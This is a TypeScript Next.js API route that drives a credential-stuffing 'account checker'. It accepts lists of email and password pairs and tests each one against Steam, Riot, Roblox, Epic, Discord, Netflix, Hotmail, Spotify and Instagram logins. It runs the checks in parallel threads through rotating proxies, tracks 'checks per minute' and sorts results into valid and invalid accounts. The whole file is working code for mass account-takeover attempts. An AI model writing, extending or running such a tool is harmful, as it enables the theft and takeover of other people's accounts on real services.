import { NextRequest, NextResponse } from 'next/server';
import { Proxy, CheckResult } from '@/types';
import { ProxyManager } from '@/lib/utils/proxy';
import { ThreadManager } from '@/lib/utils/threading';
import { config } from '@/lib/config';

// Import all checkers
import { SteamChecker } from '@/lib/checkers/steam';
import { RiotChecker } from '@/lib/checkers/riot';
import { RobloxChecker } from '@/lib/checkers/roblox';
import { EpicGamesChecker } from '@/lib/checkers/epic';
import { DiscordChecker } from '@/lib/checkers/discord';
import { NetflixChecker } from '@/lib/checkers/netflix';
import { HotmailChecker } from '@/lib/checkers/hotmail';
import { SpotifyChecker } from '@/lib/checkers/spotify';
import { InstagramChecker } from '@/lib/checkers/instagram';

const checkerMap: Record<string, any> = {
  steam: SteamChecker,
  riot: RiotChecker,
  roblox: RobloxChecker,
  epic: EpicGamesChecker,
  discord: DiscordChecker,
  netflix: NetflixChecker,
  hotmail: HotmailChecker,
  spotify: SpotifyChecker,
  instagram: InstagramChecker,
};

// Initialize configuration logging
if (config.isDevelopment()) {
  config.logConfigStatus();
}

export async function POST(request: NextRequest) {
  const startTime = Date.now();
  
  try {
    const body = await request.json();
    const {
      platform,
      accounts,
      proxies = [],
      config: clientConfig = {},
    } = body;

    // Validate platform
    if (!platform || !checkerMap[platform]) {
      return NextResponse.json(
        { error: 'Invalid platform', availablePlatforms: Object.keys(checkerMap) },
        { status: 400 }
      );
    }

    // Validate accounts
    if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
      return NextResponse.json(
        { error: 'No accounts provided' },
        { status: 400 }
      );
    }

    // Validate thread count
    const requestedThreads = clientConfig.threads || config.get('defaultThreads');
    const maxThreads = config.get('maxThreads');
    const minThreads = config.get('minThreads');
    
    if (requestedThreads > maxThreads || requestedThreads < minThreads) {
      return NextResponse.json(
        { 
          error: `Thread count must be between ${minThreads} and ${maxThreads}`,
          requested: requestedThreads,
          limits: { min: minThreads, max: maxThreads }
        },
        { status: 400 }
      );
    }

    console.log(`🚀 Starting check: Platform=${platform}, Accounts=${accounts.length}, Threads=${requestedThreads}, Proxies=${proxies.length}`);

    // Setup components
    const CheckerClass = checkerMap[platform];
    const proxyManager = proxies.length > 0 ? new ProxyManager(proxies) : null;
    const threadManager = new ThreadManager(requestedThreads);

    // Apply platform-specific rate limiting
    const platformRateLimit = config.getPlatformRateLimit(platform);
    const delayBetweenRequests = Math.max(0, (60 / platformRateLimit) * 1000);

    console.log(`⚙️ Platform rate limit: ${platformRateLimit}/min, Delay: ${delayBetweenRequests}ms`);

    // Create tasks with rate limiting
    const tasks = accounts.map((account: { email: string; password: string }, index: number) => {
      return async () => {
        // Add staggered delay to respect rate limits
        const staggerDelay = index * (delayBetweenRequests / requestedThreads);
        if (staggerDelay > 0) {
          await new Promise(resolve => setTimeout(resolve, staggerDelay));
        }

        const proxy = proxyManager?.getNext() || undefined;
        const timeout = clientConfig.timeout || config.get('defaultTimeout');
        
        const checker = new CheckerClass(proxy, timeout);
        return await checker.check(account.email, account.password);
      };
    });

    // Execute checking
    console.log(`⏳ Processing ${tasks.length} tasks with ${requestedThreads} threads...`);
    const results = await threadManager.execute(tasks);

    // Calculate statistics
    const stats = {
      total: results.length,
      valid: results.filter((r: CheckResult) => r.status === 'valid').length,
      invalid: results.filter((r: CheckResult) => r.status === 'invalid').length,
      errors: results.filter((r: CheckResult) => r.status === 'error').length,
      duration: Date.now() - startTime,
      cpm: Math.round((results.length / ((Date.now() - startTime) / 1000)) * 60),
    };

    console.log(`✅ Completed: Valid=${stats.valid}, Invalid=${stats.invalid}, Errors=${stats.errors}, Duration=${stats.duration}ms, CPM=${stats.cpm}`);

    return NextResponse.json({
      success: true,
      results,
      stats,
      platform,
      configuration: {
        threads: requestedThreads,
        timeout: clientConfig.timeout || config.get('defaultTimeout'),
        rateLimit: platformRateLimit,
        proxyEnabled: proxies.length > 0,
      },
    });

  } catch (error: any) {
    console.error('❌ Check API Error:', error);
    
    return NextResponse.json(
      { 
        error: error.message,
        duration: Date.now() - startTime,
        timestamp: new Date().toISOString(),
      },
      { status: 500 }
    );
  }
}
